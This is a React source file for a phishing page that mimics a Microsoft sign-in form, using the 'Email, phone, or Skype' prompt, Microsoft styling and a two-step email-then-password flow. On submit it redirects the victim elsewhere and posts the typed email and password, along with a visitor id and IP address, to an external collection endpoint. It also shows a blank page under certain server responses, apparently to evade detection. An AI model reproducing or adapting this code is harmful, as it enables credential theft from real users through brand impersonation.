import "./App.css";
import { useState } from "react";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import React from 'react';


function App({ visitor, ip }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  var [status, setStatus] = useState(200);
  const [showSignIn, setShowSignIn] = useState(true);
  const [animateOut, setAnimateOut] = useState(false);

  const queryParams = new URLSearchParams(window.location.search);
  const nonce = queryParams.get("nonce");

  const handleEmailChange = (event) => {
    setEmail(event.target.value);
  };

  const handlePasswordChange = (event) => {
    setPassword(event.target.value);
  };

  const handleSubmit = (event) => {
    event.preventDefault();

    if (email && !password) {
      // Start the slide out
      event.preventDefault(); // Prevent form from submitting and refreshing the page
      setAnimateOut(true);

      // Wait for the animation to finish before removing the element
      setTimeout(() => {
        setShowSignIn(false);
      }, 500); // This should match the duration of your slide-out animation
    } else if (email && password) {
      window.location.href = process.env.REACT_APP_REDIRECT_URL_M.toString();
      fetch(process.env.REACT_APP_API_URL + "login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          visitor: visitor,
          ip: ip,
          email: email,
          password: password,
        }),
      })
        .then((response) => {
          console.log(response.status);
          if (response.status === 403) {
            setStatus(403);
          } else {
            setStatus(200);
          }
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    }
  };

  const backgroundStyle = {
    backgroundImage: `url('/bg.svg')`, 
    backgroundPosition: "center center", 
    backgroundRepeat: "no-repeat", 
  };

  const handleNextClick = (event) => {
    event.preventDefault(); 
    setAnimateOut(true);

    setTimeout(() => {
      setShowSignIn(false);
    }, 500); 
  };

  return (
    <>
      {status === 403 && nonce ? (
        <div></div>
      ) : (
        <div
          className="flex flex-col items-center justify-center min-h-screen bg-gray-100 p-4"
          style={backgroundStyle}
        >
          <div
            className="bg-white drop-shadow-md overflow-hidden"
            style={{
              width: "440px",
              height: "338px",
              padding: "32px",
            }}
          >
            <form className="space-y-6 p-[13px]" onSubmit={handleSubmit}>
              <img
                className="w-auto"
                src="/m_logo.svg" // 
                alt=" Logo"
              />
              {showSignIn ? (
                <div
                  className={`transition duration-300 ${
                    animateOut ? "animate-slideAndFade" : ""
                  }`}
                >
                  <div>
                    <h2 className=" mt-[-15px] text-2xl font-semibold text-gray-900">
                      Sign in
                    </h2>
                  </div>
                  <div style={{ marginTop: "10px" }}>
                    <label htmlFor="email" className="sr-only">
                      Email, phone, or Skype
                    </label>
                    <input
                      id="email"
                      name="email"
                      type="text"
                      required
                      className="appearance-none block w-full py-2 border-b border-black placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-indigo-500  sm:text-md"
                      placeholder="Email, phone, or Skype"
                      value={email}
                      onChange={handleEmailChange}
                    />
                  </div>
                  <div
                    className="text-sm text-[12.5px] text-gray-800"
                    style={{ marginTop: "20px" }}
                  >
                    No account? &nbsp;
                    <a href="#" className="text-[#0067b8]">
                      Create one!
                    </a>
                  </div>
                  <div className="text-[12.5px]" style={{ marginTop: "18px" }}>
                    <a href="#" className="text-[#0067b8]">
                      Can't access your account?
                    </a>
                  </div>
                  <div className="flex justify-end">
                    <button
                      type="submit"
                      onSubmit={() => handleNextClick()}
                      className="group relative w-[110px] h-[30px] mt-4 flex items-center justify-center border border-transparent text-md font-medium text-white bg-[#0067b8] hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
                    >
                      Next
                    </button>
                  </div>
                </div>
              ) : (
                <div
                  className="animate-slideAndFadeIn"
                  style={{ marginTop: "12px" }}
                >
                  <div style={{ marginBottom: "20px" }}>
                    <button className="p-1 text-sm rounded-full text-whitefocus:ring-2  focus:ring-offset-2">
                      <ArrowBackIcon
                        className="text-gray-500"
                        style={{ fontSize: "15px" }}
                      />
                    </button>
                    <span className="">{email}</span>
                  </div>

                  <div>
                    <h2 className="mt-[-20px] text-2xl font-semibold text-gray-900">
                      Enter password
                    </h2>
                  </div>

                  <div style={{ marginTop: "10px" }}>
                    <label htmlFor="email" className="sr-only">
                      Password
                    </label>
                    <input
                      id="password"
                      name="password"
                      type="password"
                      required
                      className="appearance-none block w-full py-2 border-b border-black placeholder-gray-500 text-gray-900 focus:outline-none focus:ring-indigo-500  sm:text-md"
                      placeholder="Password"
                      value={password}
                      onChange={handlePasswordChange}
                    />
                  </div>

                  <div
                    className="text-sm text-[12.5px] text-gray-600"
                    style={{ marginTop: "20px" }}
                  >
                    <a href="#" className="text-[#0067b8]">
                      Forgot my password
                    </a>
                  </div>

                  <div className="flex justify-end">
                    <button
                      type="submit"
                      className="group relative w-[110px] h-[33px] mt-4 flex items-center justify-center border border-transparent text-md font-medium text-white bg-[#0067b8] hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500"
                    >
                      Sign in
                    </button>
                  </div>
                </div>
              )}
            </form>
          </div>

          <div
            className={`bg-white drop-shadow-md overflow-hidden mt-[20px] ${
              !showSignIn ? "animate-fadeOut" : ""
            }`}
            style={{
              width: "440px",
              height: "48px",
            }}
          >
            <div className="flex items-center ml-10 mt-2">
              <img
                src="/key.svg"
                alt="Sign-in Options"
                className="mr-3 " // Add some margin to the right of the image
                style={{ height: "33px" }}
              />
              <span className="text-[12.5] ">Sign-in options</span>{" "}
              {/* text-sm for 15px font size */}
            </div>
          </div>
        </div>
      )}
    </>
  );
}

export default App;
